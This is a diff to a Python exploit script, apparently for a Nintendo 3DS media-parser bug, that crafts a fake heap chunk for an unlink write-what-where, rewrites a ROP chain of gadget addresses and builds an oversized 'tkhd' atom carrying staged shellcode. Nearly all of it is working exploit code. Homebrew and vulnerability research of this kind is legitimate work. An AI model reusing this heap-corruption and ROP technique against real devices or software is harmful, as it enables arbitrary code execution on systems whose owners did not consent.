@@ -50,6 +50,13 @@ def get_shellcode():
         assert len(payload) == STAGE2_SIZE
         return payload
 
+def create_heap_chunk(prv, nxt, sz):
+    r  = "DU\x00\x00" # "used" marker, plus alignment-related fields = 0
+    r += p(sz)        # size, < 0x10 to avoid putting it in free list
+    r += p(prv)
+    r += p(nxt)
+    return r
+
 # end = end1 + end2 in the code, pick end2 so end wraps to start+4
 desired_end = start + 4 # to make size 4
 magic_end = (desired_end - end1) % 2**32
@@ -60,19 +67,23 @@ malloc_free_list_head = heapctx + 0x3C
 what = fake_free_chunk
 where = malloc_free_list_head
 
-r1 = what
-r2 = where - 12
-
 UNICODE_MARKER = '\xff\xfe' # unicode marker
 
 exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
 exp += " \x00"*((772-len(exp)) / 2)
 assert len(exp) == 772
 
-exp += "aaaa" # base
-exp += p(magic_end) # r3
-exp += p(r2) # r2
-exp += p(r1) # r1
+#what = 0x14001a10 # address of tag in mem
+exp += create_heap_chunk(where - 12, what, 0)
+#exp += "B"*0x10 # avoid coalescing, just in case
+#exp += create_heap_chunk(0x12345678, fake_free_chunk, 0) # the prev field here is corrupted by the unlinking of the previous chunk
+
+# what = p(0x14001a10)
+# exp += "RF\x00\x00" # magic ("FR" reversed), plus alignment fields
+# exp += p(8) # size, needs to be < 0x10
+# exp += p(where - 0x0C) # prev = where - (offset of "next" field)
+# exp += p(what) # next (needs to be writeable, next-> prev will be corrupted)
+# Note: free_chunk->prev = where - 0xC
 
 def pa_to_gpu(pa):
     return pa - 0x0C000000
@@ -83,27 +94,21 @@ def gpu_to_pa(gpua):
 # 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
 # "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
 def code_va_to_pa(va):
-    if TYPE == "old":
-        if FIRM == "post5":
-            return va + 0x23D00000
-        else:
-            return va + 0x23D00000 - 0x78000
-    else:
-        return va + 0x27900000
+    return 0x23f64d00 #va - 0x00100000 + 0x23d6f000
+    # if TYPE == "old":
+    #     if FIRM == "post5":
+    #         return va + 0x23D00000
+    #     else:
+    #         return va + 0x23D00000 - 0x78000
+    # else:
+    #     return va + 0x27900000
 
 #starts at this pop
 #.text:0027DB00 LDMFD           SP!, {R4-R10,PC}
 
 payload = get_shellcode()
 
-rop  = "AAAA" # r4
-rop += "BBBB" # r5
-rop += "CCCC" # r6
-rop += "DDDD" # r7
-rop += "EEEE" # r8
-rop += "FFFF" # r9
-rop += "GGGG" # r10
-rop += p(pop_r0_pc) # pc
+rop  = p(pop_r0_pc) # pc
 rop += p(payload_heap_addr) # dst
 rop += p(pop_r1_pc)
 rop += p(payload_stack_addr) # src
@@ -162,10 +167,14 @@ rop += "cccc" # r6
 rop += p(stage2_code_va)
 rop += payload
 
-tkhd_data = 'A'*136 # padding
-if (REGION != 'kor') and (REGION != 'chn'):
-    tkhd_data += 'A'*0x28 # padding
-tkhd_data += rop # ROP starts here
+tkhd_data = '\x77'*(0x4C - 0x28)
+tkhd_data += rop
+
+#'\x77'*0x500 #''.join(p(0xFF000000 | (i << 8)) for i in xrange(0x1A0))
+# tkhd_data = '\x77'*136 # padding
+# if (REGION != 'kor') and (REGION != 'chn'):
+#     tkhd_data += 'A'*0x28 # padding
+# tkhd_data += '\x77'*0x500#rop # ROP starts here
 tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
 tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")
 
